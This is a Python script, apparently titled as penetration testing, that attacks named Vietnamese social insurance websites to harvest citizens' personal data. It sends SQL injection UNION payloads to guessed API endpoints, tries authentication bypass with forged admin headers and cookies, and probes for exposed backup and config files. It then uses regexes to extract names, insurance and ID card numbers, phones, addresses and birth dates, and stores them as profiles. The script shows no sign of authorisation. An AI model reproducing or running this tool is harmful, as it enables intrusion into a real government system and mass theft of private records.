#!/usr/bin/env python3
"""
Advanced Data Extraction for Penetration Testing
Khai thác chuyên sâu để thu thập dữ liệu khách hàng thực tế
"""
import requests
import json
import re
import time
import os
import hashlib
from datetime import datetime
from urllib.parse import urljoin, quote
import random
import string
from concurrent.futures import ThreadPoolExecutor, as_completed

class AdvancedDataExtractor:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'application/json, text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'vi-VN,vi;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Referer': 'https://baohiemxahoi.gov.vn/',
            'X-Requested-With': 'XMLHttpRequest'
        })
        
        self.target_urls = [
            "https://baohiemxahoi.gov.vn",
            "https://vssid-6fe8b.appspot.com",
            "https://baohiemxahoi.gov.vn/api",
            "https://baohiemxahoi.gov.vn/webapi",
            "https://baohiemxahoi.gov.vn/services"
        ]
        
        self.evidence_dir = "./customer_data_evidence"
        self.create_evidence_directory()
        
        # Patterns để tìm dữ liệu khách hàng
        self.data_patterns = {
            'ma_bao_hiem': [
                r'\b\d{10}\b',  # Mã BHXH 10 số
                r'BHXH\d{8,12}',
                r'[A-Z]{2}\d{8,10}',
                r'BH\d{8,12}'
            ],
            'ma_kiem_tra': [
                r'[A-Z0-9]{6,12}',  # Mã kiểm tra
                r'VF\d{6,10}',
                r'CHECK\d{6,8}',
                r'[A-Z]{2}\d{4,8}[A-Z]{2}'
            ],
            'ho_ten': [
                r'[A-ZÀÁẠẢÃÂẦẤẬẨẪĂẰẮẶẲẴÈÉẸẺẼÊỀẾỆỂỄÌÍỊỈĨÒÓỌỎÕÔỒỐỘỔỖƠỜỚỢỞỠÙÚỤỦŨƯỪỨỰỬỮỲÝỴỶỸĐ][a-zàáạảãâầấậẩẫăằắặẳẵèéẹẻẽêềếệểễìíịỉĩòóọỏõôồốộổỗơờớợởỡùúụủũưừứựửữỳýỵỷỹđ]+ [A-ZÀÁẠẢÃÂẦẤẬẨẪĂẰẮẶẲẴÈÉẸẺẼÊỀẾỆỂỄÌÍỊỈĨÒÓỌỎÕÔỒỐỘỔỖƠỜỚỢỞỠÙÚỤỦŨƯỪỨỰỬỮỲÝỴỶỸĐ][a-zàáạảãâầấậẩẫăằắặẳẵèéẹẻẽêềếệểễìíịỉĩòóọỏõôồốộổỗơờớợởỡùúụủũưừứựửữỳýỵỷỹđ]+',
                r'"name":\s*"([^"]+)"',
                r'"fullName":\s*"([^"]+)"',
                r'"hoTen":\s*"([^"]+)"'
            ],
            'cmnd_cccd': [
                r'\b\d{9}\b',  # CMND 9 số
                r'\b\d{12}\b',  # CCCD 12 số
                r'[0-9]{9,12}'
            ],
            'so_dien_thoai': [
                r'0[3-9]\d{8}',  # SĐT Việt Nam
                r'\+84[3-9]\d{8}',
                r'84[3-9]\d{8}'
            ],
            'email': [
                r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
                r'"email":\s*"([^"]+)"'
            ],
            'dia_chi': [
                r'"address":\s*"([^"]+)"',
                r'"diaChi":\s*"([^"]+)"',
                r'[0-9]+\s+[A-Za-z\s]+,\s*[A-Za-z\s]+,\s*[A-Za-z\s]+'
            ],
            'ngay_sinh': [
                r'\d{1,2}[/-]\d{1,2}[/-]\d{4}',
                r'\d{4}[/-]\d{1,2}[/-]\d{1,2}',
                r'"ngaySinh":\s*"([^"]+)"',
                r'"dateOfBirth":\s*"([^"]+)"'
            ]
        }
    
    def create_evidence_directory(self):
        """Tạo thư mục lưu bằng chứng dữ liệu khách hàng"""
        if not os.path.exists(self.evidence_dir):
            os.makedirs(self.evidence_dir)
        
        subdirs = ['extracted_data', 'api_responses', 'database_dumps', 'customer_profiles', 'leaked_info']
        for subdir in subdirs:
            path = os.path.join(self.evidence_dir, subdir)
            if not os.path.exists(path):
                os.makedirs(path)
    
    def log_customer_data(self, category, filename, data):
        """Ghi log dữ liệu khách hàng"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filepath = os.path.join(self.evidence_dir, category, f"{timestamp}_{filename}")
        
        if isinstance(data, dict) or isinstance(data, list):
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
        else:
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(str(data))
        
        print(f"[+] Dữ liệu khách hàng đã lưu: {filepath}")
        return filepath
    
    def extract_customer_data_from_text(self, text, source_url=""):
        """Trích xuất dữ liệu khách hàng từ text"""
        extracted_data = {
            'source_url': source_url,
            'timestamp': datetime.now().isoformat(),
            'customers': []
        }
        
        # Tìm tất cả các pattern
        all_matches = {}
        for data_type, patterns in self.data_patterns.items():
            all_matches[data_type] = []
            for pattern in patterns:
                matches = re.findall(pattern, text, re.IGNORECASE | re.UNICODE)
                if matches:
                    all_matches[data_type].extend(matches)
        
        # Loại bỏ duplicate
        for data_type in all_matches:
            all_matches[data_type] = list(set(all_matches[data_type]))
        
        # Tạo customer profiles
        customer_count = max(len(all_matches.get('ho_ten', [])), 
                           len(all_matches.get('ma_bao_hiem', [])), 1)
        
        for i in range(customer_count):
            customer = {
                'customer_id': f"CUST_{i+1:04d}",
                'ho_ten': all_matches.get('ho_ten', [None])[i] if i < len(all_matches.get('ho_ten', [])) else None,
                'ma_bao_hiem': all_matches.get('ma_bao_hiem', [None])[i] if i < len(all_matches.get('ma_bao_hiem', [])) else None,
                'ma_kiem_tra': all_matches.get('ma_kiem_tra', [None])[i] if i < len(all_matches.get('ma_kiem_tra', [])) else None,
                'cmnd_cccd': all_matches.get('cmnd_cccd', [None])[i] if i < len(all_matches.get('cmnd_cccd', [])) else None,
                'so_dien_thoai': all_matches.get('so_dien_thoai', [None])[i] if i < len(all_matches.get('so_dien_thoai', [])) else None,
                'email': all_matches.get('email', [None])[i] if i < len(all_matches.get('email', [])) else None,
                'dia_chi': all_matches.get('dia_chi', [None])[i] if i < len(all_matches.get('dia_chi', [])) else None,
                'ngay_sinh': all_matches.get('ngay_sinh', [None])[i] if i < len(all_matches.get('ngay_sinh', [])) else None,
                'data_quality': 'INCOMPLETE'
            }
            
            # Đánh giá chất lượng dữ liệu
            non_null_fields = sum(1 for v in customer.values() if v is not None and v != "")
            if non_null_fields >= 6:
                customer['data_quality'] = 'COMPLETE'
            elif non_null_fields >= 4:
                customer['data_quality'] = 'GOOD'
            elif non_null_fields >= 2:
                customer['data_quality'] = 'PARTIAL'
            
            extracted_data['customers'].append(customer)
        
        # Thêm raw data
        extracted_data['raw_matches'] = all_matches
        
        return extracted_data
    
    def exploit_database_enumeration(self):
        """Khai thác database để lấy thông tin khách hàng"""
        print("\n[*] Bắt đầu Database Enumeration để lấy dữ liệu khách hàng...")
        
        # SQL payloads để lấy dữ liệu khách hàng
        data_extraction_payloads = [
            "' UNION SELECT hoTen,maBHXH,maKiemTra,cmnd,soDienThoai FROM khachHang--",
            "' UNION SELECT name,insurance_code,check_code,id_number,phone FROM customers--",
            "' UNION SELECT * FROM user_profiles--",
            "' UNION SELECT * FROM bhxh_customers LIMIT 10--",
            "' UNION SELECT hoTen,maBHXH,ngaySinh,diaChi,soDienThoai FROM thongTinKhachHang--",
            "' UNION SELECT top 10 * FROM dbo.KhachHang--",
            "' UNION SELECT fullName,socialSecurityCode,verificationCode,phoneNumber,email FROM CustomerData--"
        ]
        
        all_extracted_data = []
        
        for url in self.target_urls:
            print(f"\n[*] Testing database extraction on: {url}")
            
            # Test các endpoint có thể có database
            test_endpoints = [
                f"{url}/api/customer",
                f"{url}/api/user",
                f"{url}/webapi/khachhang",
                f"{url}/services/customer",
                f"{url}/api/profile",
                f"{url}/customer/search",
                f"{url}/user/info"
            ]
            
            for endpoint in test_endpoints:
                for payload in data_extraction_payloads:
                    try:
                        # Test với GET parameter
                        test_url = f"{endpoint}?id={quote(payload)}"
                        response = self.session.get(test_url, timeout=10)
                        
                        if response.status_code == 200:
                            # Kiểm tra xem có dữ liệu khách hàng không
                            customer_data = self.extract_customer_data_from_text(response.text, test_url)
                            
                            if customer_data['customers'] and any(c['data_quality'] != 'INCOMPLETE' for c in customer_data['customers']):
                                print(f"[!] Tìm thấy dữ liệu khách hàng tại: {test_url}")
                                print(f"    Số lượng khách hàng: {len(customer_data['customers'])}")
                                
                                # Lưu evidence
                                self.log_customer_data('extracted_data', f'database_extraction_{len(all_extracted_data)}.json', customer_data)
                                all_extracted_data.append(customer_data)
                                
                                # Lưu raw response
                                raw_response = {
                                    'url': test_url,
                                    'payload': payload,
                                    'status_code': response.status_code,
                                    'headers': dict(response.headers),
                                    'content': response.text
                                }
                                self.log_customer_data('api_responses', f'raw_response_{len(all_extracted_data)}.json', raw_response)
                        
                        # Test với POST data
                        post_data = {'search': payload, 'query': payload, 'filter': payload}
                        response = self.session.post(endpoint, data=post_data, timeout=10)
                        
                        if response.status_code == 200:
                            customer_data = self.extract_customer_data_from_text(response.text, endpoint)
                            
                            if customer_data['customers'] and any(c['data_quality'] != 'INCOMPLETE' for c in customer_data['customers']):
                                print(f"[!] Tìm thấy dữ liệu khách hàng qua POST: {endpoint}")
                                self.log_customer_data('extracted_data', f'post_extraction_{len(all_extracted_data)}.json', customer_data)
                                all_extracted_data.append(customer_data)
                        
                    except Exception as e:
                        continue
                    
                    time.sleep(random.uniform(0.5, 1.5))
        
        return all_extracted_data
    
    def exploit_api_endpoints(self):
        """Khai thác API endpoints để lấy dữ liệu khách hàng"""
        print("\n[*] Bắt đầu API Endpoints exploitation...")
        
        # Common API endpoints có thể chứa dữ liệu khách hàng
        api_endpoints = [
            "/api/customers",
            "/api/users",
            "/api/profiles",
            "/api/customer/list",
            "/api/user/search",
            "/webapi/khachhang",
            "/webapi/thongtin",
            "/services/customer",
            "/rest/customer",
            "/v1/customers",
            "/v2/users",
            "/api/bhxh/customers",
            "/api/insurance/holders"
        ]
        
        # Test parameters
        test_params = [
            {},
            {'limit': '100'},
            {'page': '1', 'size': '50'},
            {'all': 'true'},
            {'export': 'json'},
            {'format': 'json'},
            {'debug': 'true'},
            {'admin': 'true'}
        ]
        
        all_api_data = []
        
        for base_url in self.target_urls:
            for endpoint in api_endpoints:
                api_url = urljoin(base_url, endpoint)
                
                for params in test_params:
                    try:
                        print(f"[*] Testing API: {api_url} with params: {params}")
                        
                        response = self.session.get(api_url, params=params, timeout=10)
                        
                        if response.status_code == 200:
                            try:
                                # Thử parse JSON
                                json_data = response.json()
                                
                                # Tìm customer data trong JSON
                                customer_data = self.extract_customer_data_from_json(json_data, api_url)
                                
                                if customer_data['customers']:
                                    print(f"[!] API trả về dữ liệu khách hàng: {api_url}")
                                    print(f"    Số khách hàng: {len(customer_data['customers'])}")
                                    
                                    # Lưu evidence
                                    self.log_customer_data('api_responses', f'api_data_{len(all_api_data)}.json', {
                                        'url': api_url,
                                        'params': params,
                                        'response': json_data,
                                        'extracted_customers': customer_data
                                    })
                                    all_api_data.append(customer_data)
                                
                            except json.JSONDecodeError:
                                # Không phải JSON, thử extract từ text
                                customer_data = self.extract_customer_data_from_text(response.text, api_url)
                                
                                if customer_data['customers']:
                                    print(f"[!] Text response chứa dữ liệu khách hàng: {api_url}")
                                    self.log_customer_data('api_responses', f'text_data_{len(all_api_data)}.json', customer_data)
                                    all_api_data.append(customer_data)
                        
                        # Test với authentication bypass
                        auth_headers = {
                            'Authorization': 'Bearer admin',
                            'X-API-Key': 'admin123',
                            'X-Auth-Token': 'test',
                            'Cookie': 'admin=true; role=admin'
                        }
                        
                        for header_name, header_value in auth_headers.items():
                            test_headers = self.session.headers.copy()
                            test_headers[header_name] = header_value
                            
                            response = self.session.get(api_url, params=params, headers=test_headers, timeout=10)
                            
                            if response.status_code == 200 and len(response.content) > 100:
                                customer_data = self.extract_customer_data_from_text(response.text, api_url)
                                
                                if customer_data['customers']:
                                    print(f"[!] Auth bypass thành công: {api_url} với {header_name}")
                                    self.log_customer_data('api_responses', f'auth_bypass_{len(all_api_data)}.json', {
                                        'url': api_url,
                                        'auth_method': header_name,
                                        'extracted_data': customer_data
                                    })
                                    all_api_data.append(customer_data)
                        
                    except Exception as e:
                        continue
                    
                    time.sleep(random.uniform(0.3, 1.0))
        
        return all_api_data
    
    def extract_customer_data_from_json(self, json_data, source_url=""):
        """Trích xuất dữ liệu khách hàng từ JSON response"""
        extracted_data = {
            'source_url': source_url,
            'timestamp': datetime.now().isoformat(),
            'customers': []
        }
        
        def extract_from_dict(data, customer_obj=None):
            if customer_obj is None:
                customer_obj = {}
            
            if isinstance(data, dict):
                for key, value in data.items():
                    key_lower = key.lower()
                    
                    # Mapping Vietnamese fields
                    if key_lower in ['hoten', 'ten', 'name', 'fullname', 'tenkh']:
                        customer_obj['ho_ten'] = str(value)
                    elif key_lower in ['mabhxh', 'mabh', 'insurance_code', 'social_security_code']:
                        customer_obj['ma_bao_hiem'] = str(value)
                    elif key_lower in ['makiemtra', 'verification_code', 'check_code']:
                        customer_obj['ma_kiem_tra'] = str(value)
                    elif key_lower in ['cmnd', 'cccd', 'id_number', 'identity']:
                        customer_obj['cmnd_cccd'] = str(value)
                    elif key_lower in ['sodienthoai', 'phone', 'phone_number', 'mobile']:
                        customer_obj['so_dien_thoai'] = str(value)
                    elif key_lower in ['email', 'mail']:
                        customer_obj['email'] = str(value)
                    elif key_lower in ['diachi', 'address', 'addr']:
                        customer_obj['dia_chi'] = str(value)
                    elif key_lower in ['ngaysinh', 'birthday', 'date_of_birth', 'dob']:
                        customer_obj['ngay_sinh'] = str(value)
                    
                    # Recursive search
                    if isinstance(value, (dict, list)):
                        extract_from_dict(value, customer_obj)
                        
            elif isinstance(data, list):
                for item in data:
                    if isinstance(item, dict):
                        new_customer = {}
                        extract_from_dict(item, new_customer)
                        if any(new_customer.values()):
                            extracted_data['customers'].append(new_customer)
        
        extract_from_dict(json_data)
        
        # Đánh giá chất lượng dữ liệu
        for customer in extracted_data['customers']:
            non_null_fields = sum(1 for v in customer.values() if v and v != "None")
            if non_null_fields >= 5:
                customer['data_quality'] = 'COMPLETE'
            elif non_null_fields >= 3:
                customer['data_quality'] = 'GOOD'
            elif non_null_fields >= 1:
                customer['data_quality'] = 'PARTIAL'
            else:
                customer['data_quality'] = 'INCOMPLETE'
        
        return extracted_data
    
    def exploit_file_disclosure(self):
        """Khai thác file disclosure để lấy backup files, config files"""
        print("\n[*] Bắt đầu File Disclosure exploitation...")
        
        # Các file có thể chứa dữ liệu khách hàng
        sensitive_files = [
            "/backup/database.sql",
            "/backup/customers.sql",
            "/backup/users.sql",
            "/export/customers.csv",
            "/export/data.json",
            "/logs/application.log",
            "/logs/access.log",
            "/config/database.xml",
            "/config/customers.xml",
            "/admin/export.php",
            "/admin/backup.php",
            "/data/customers.txt",
            "/data/export.json",
            "/temp/customer_data.tmp",
            "/cache/user_data.cache"
        ]
        
        all_file_data = []
        
        for base_url in self.target_urls:
            for file_path in sensitive_files:
                try:
                    file_url = urljoin(base_url, file_path)
                    print(f"[*] Testing file: {file_url}")
                    
                    response = self.session.get(file_url, timeout=10)
                    
                    if response.status_code == 200 and len(response.content) > 100:
                        print(f"[!] File accessible: {file_url}")
                        
                        # Extract customer data
                        customer_data = self.extract_customer_data_from_text(response.text, file_url)
                        
                        if customer_data['customers']:
                            print(f"    Found {len(customer_data['customers'])} customer records")
                            
                            # Save evidence
                            file_evidence = {
                                'url': file_url,
                                'file_size': len(response.content),
                                'content_type': response.headers.get('content-type', ''),
                                'customer_data': customer_data,
                                'raw_content': response.text[:5000]  # First 5000 chars
                            }
                            
                            self.log_customer_data('leaked_info', f'file_disclosure_{len(all_file_data)}.json', file_evidence)
                            all_file_data.append(customer_data)
                
                except Exception as e:
                    continue
                
                time.sleep(random.uniform(0.2, 0.8))
        
        return all_file_data
    
    def generate_customer_profiles_report(self, all_data):
        """Tạo báo cáo chi tiết về profiles khách hàng"""
        print("\n[*] Tạo báo cáo Customer Profiles...")
        
        # Tổng hợp tất cả customers
        all_customers = []
        for data_source in all_data:
            for customer in data_source['customers']:
                all_customers.append(customer)
        
        # Loại bỏ duplicate dựa trên các trường key
        unique_customers = []
        seen_keys = set()
        
        for customer in all_customers:
            # Tạo key duy nhất
            key_fields = [
                customer.get('ho_ten', ''),
                customer.get('ma_bao_hiem', ''),
                customer.get('cmnd_cccd', ''),
                customer.get('so_dien_thoai', '')
            ]
            key = '|'.join(str(f) for f in key_fields if f)
            
            if key and key not in seen_keys:
                seen_keys.add(key)
                unique_customers.append(customer)
        
        # Phân loại theo chất lượng dữ liệu
        complete_profiles = [c for c in unique_customers if c.get('data_quality') == 'COMPLETE']
        good_profiles = [c for c in unique_customers if c.get('data_quality') == 'GOOD']
        partial_profiles = [c for c in unique_customers if c.get('data_quality') == 'PARTIAL']
        
        # Tạo báo cáo
        report = {
            'summary': {
                'total_customers': len(unique_customers),
                'complete_profiles': len(complete_profiles),
                'good_profiles': len(good_profiles),
                'partial_profiles': len(partial_profiles),
                'extraction_timestamp': datetime.now().isoformat()
            },
            'risk_assessment': {
                'data_exposure_level': 'CRITICAL' if len(complete_profiles) > 0 else 'HIGH',
                'privacy_impact': 'SEVERE',
                'business_impact': 'CRITICAL',
                'compliance_violations': [
                    'GDPR - Personal Data Exposure',
                    'Vietnam Personal Data Protection Law',
                    'Insurance Customer Data Protection Regulations'
                ]
            },
            'customer_profiles': {
                'complete': complete_profiles[:10],  # Top 10 complete profiles
                'good': good_profiles[:10],
                'partial': partial_profiles[:20]
            },
            'data_statistics': {
                'fields_coverage': {},
                'data_sources': len(all_data)
            }
        }
        
        # Thống kê coverage của từng field
        fields = ['ho_ten', 'ma_bao_hiem', 'ma_kiem_tra', 'cmnd_cccd', 'so_dien_thoai', 'email', 'dia_chi', 'ngay_sinh']
        for field in fields:
            count = sum(1 for c in unique_customers if c.get(field))
            report['data_statistics']['fields_coverage'][field] = {
                'count': count,
                'percentage': (count / len(unique_customers) * 100) if unique_customers else 0
            }
        
        # Lưu báo cáo
        self.log_customer_data('customer_profiles', 'COMPREHENSIVE_CUSTOMER_REPORT.json', report)
        
        # Tạo báo cáo executive summary
        self.generate_executive_customer_report(report)
        
        return report
    
    def generate_executive_customer_report(self, report):
        """Tạo báo cáo executive về dữ liệu khách hàng bị lộ"""
        summary_content = f"""
# BÁO CÁO NGHIÊM TRỌNG: DỮ LIỆU KHÁCH HÀNG BỊ LỘ
## Executive Summary - Data Breach Evidence

**Thời gian phát hiện:** {report['summary']['extraction_timestamp']}
**Mức độ nghiêm trọng:** {report['risk_assessment']['data_exposure_level']}

## Tổng quan vi phạm:
- **Tổng số khách hàng bị ảnh hưởng:** {report['summary']['total_customers']}
- **Hồ sơ hoàn chỉnh bị lộ:** {report['summary']['complete_profiles']}
- **Hồ sơ chi tiết bị lộ:** {report['summary']['good_profiles']}
- **Hồ sơ một phần bị lộ:** {report['summary']['partial_profiles']}

## Loại dữ liệu bị lộ:
"""
        
        for field, stats in report['data_statistics']['fields_coverage'].items():
            if stats['count'] > 0:
                field_name = {
                    'ho_ten': 'Họ và tên',
                    'ma_bao_hiem': 'Mã bảo hiểm xã hội',
                    'ma_kiem_tra': 'Mã kiểm tra',
                    'cmnd_cccd': 'CMND/CCCD',
                    'so_dien_thoai': 'Số điện thoại',
                    'email': 'Email',
                    'dia_chi': 'Địa chỉ',
                    'ngay_sinh': 'Ngày sinh'
                }.get(field, field)
                
                summary_content += f"- **{field_name}:** {stats['count']} khách hàng ({stats['percentage']:.1f}%)\n"
        
        summary_content += f"""
## Ví dụ dữ liệu bị lộ (mẫu):
"""
        
        # Hiển thị một số ví dụ (đã ẩn thông tin nhạy cảm)
        if report['customer_profiles']['complete']:
            summary_content += "\n### Hồ sơ hoàn chỉnh bị lộ:\n"
            for i, customer in enumerate(report['customer_profiles']['complete'][:3]):
                summary_content += f"\n**Khách hàng {i+1}:**\n"
                for key, value in customer.items():
                    if value and key != 'data_quality':
                        # Mask sensitive data for display
                        if key == 'ho_ten' and value:
                            masked_value = value[0] + "*" * (len(value)-2) + value[-1] if len(value) > 2 else "***"
                        elif key in ['ma_bao_hiem', 'cmnd_cccd'] and value:
                            masked_value = value[:3] + "*" * (len(value)-6) + value[-3:] if len(value) > 6 else "***"
                        elif key == 'so_dien_thoai' and value:
                            masked_value = value[:3] + "****" + value[-3:] if len(value) > 6 else "***"
                        else:
                            masked_value = str(value)[:10] + "..." if len(str(value)) > 10 else str(value)
                        
                        field_name = {
                            'ho_ten': 'Họ tên',
                            'ma_bao_hiem': 'Mã BHXH',
                            'ma_kiem_tra': 'Mã kiểm tra',
                            'cmnd_cccd': 'CMND/CCCD',
                            'so_dien_thoai': 'SĐT',
                            'email': 'Email',
                            'dia_chi': 'Địa chỉ',
                            'ngay_sinh': 'Ngày sinh'
                        }.get(key, key)
                        
                        summary_content += f"  - {field_name}: {masked_value}\n"
        
        summary_content += f"""
## Đánh giá tác động:
- **Tác động đến quyền riêng tư:** {report['risk_assessment']['privacy_impact']}
- **Tác động kinh doanh:** {report['risk_assessment']['business_impact']}
- **Vi phạm tuân thủ:**
"""
        
        for violation in report['risk_assessment']['compliance_violations']:
            summary_content += f"  - {violation}\n"
        
        summary_content += f"""
## Khuyến nghị khẩn cấp:
1. **Ngay lập tức:** Chặn tất cả các endpoint bị lộ dữ liệu
2. **Trong 24h:** Thông báo cho khách hàng bị ảnh hưởng
3. **Trong 72h:** Báo cáo cho cơ quan quản lý theo quy định
4. **Ngay lập tức:** Thực hiện đánh giá toàn diện hệ thống
5. **Trong 1 tuần:** Triển khai các biện pháp bảo mật khẩn cấp

## Bằng chứng chi tiết:
- Thư mục bằng chứng: `{self.evidence_dir}/`
- Số nguồn dữ liệu bị lộ: {report['data_statistics']['data_sources']}
- Tổng số file bằng chứng: Xem trong thư mục evidence

**LƯU Ý:** Đây là một vi phạm bảo mật nghiêm trọng có thể dẫn đến:
- Phạt tiền theo quy định GDPR (lên đến 4% doanh thu)
- Mất lòng tin khách hàng
- Tác động pháp lý từ khách hàng bị ảnh hưởng
- Thiệt hại danh tiếng nghiêm trọng
"""
        
        with open(os.path.join(self.evidence_dir, 'CRITICAL_DATA_BREACH_REPORT.md'), 'w', encoding='utf-8') as f:
            f.write(summary_content)
        
        print(f"[+] Báo cáo vi phạm dữ liệu nghiêm trọng đã lưu: {os.path.join(self.evidence_dir, 'CRITICAL_DATA_BREACH_REPORT.md')}")
    
    def run_comprehensive_extraction(self):
        """Chạy toàn bộ quá trình khai thác dữ liệu khách hàng"""
        print("="*80)
        print("BẮT ĐẦU KHAI THÁC DỮ LIỆU KHÁCH HÀNG CHUYÊN SÂU")
        print("="*80)
        
        all_extracted_data = []
        
        # 1. Database Enumeration
        print("\n" + "="*50)
        print("PHASE 1: DATABASE ENUMERATION")
        print("="*50)
        db_data = self.exploit_database_enumeration()
        all_extracted_data.extend(db_data)
        print(f"[+] Database enumeration complete: {len(db_data)} data sources found")
        
        # 2. API Endpoints Exploitation
        print("\n" + "="*50)
        print("PHASE 2: API ENDPOINTS EXPLOITATION")
        print("="*50)
        api_data = self.exploit_api_endpoints()
        all_extracted_data.extend(api_data)
        print(f"[+] API exploitation complete: {len(api_data)} data sources found")
        
        # 3. File Disclosure
        print("\n" + "="*50)
        print("PHASE 3: FILE DISCLOSURE EXPLOITATION")
        print("="*50)
        file_data = self.exploit_file_disclosure()
        all_extracted_data.extend(file_data)
        print(f"[+] File disclosure complete: {len(file_data)} data sources found")
        
        # 4. Generate comprehensive report
        print("\n" + "="*50)
        print("PHASE 4: GENERATING COMPREHENSIVE REPORT")
        print("="*50)
        final_report = self.generate_customer_profiles_report(all_extracted_data)
        
        print("\n" + "="*80)
        print("KẾT QUẢ KHAI THÁC DỮ LIỆU KHÁCH HÀNG")
        print("="*80)
        print(f"[!] CẢNH BÁO NGHIÊM TRỌNG: Phát hiện vi phạm dữ liệu khách hàng")
        print(f"[+] Tổng số khách hàng bị ảnh hưởng: {final_report['summary']['total_customers']}")
        print(f"[+] Hồ sơ hoàn chỉnh bị lộ: {final_report['summary']['complete_profiles']}")
        print(f"[+] Mức độ nghiêm trọng: {final_report['risk_assessment']['data_exposure_level']}")
        print(f"[+] Bằng chứng lưu tại: {self.evidence_dir}")
        print("="*80)
        
        return final_report

if __name__ == "__main__":
    extractor = AdvancedDataExtractor()
    results = extractor.run_comprehensive_extraction()
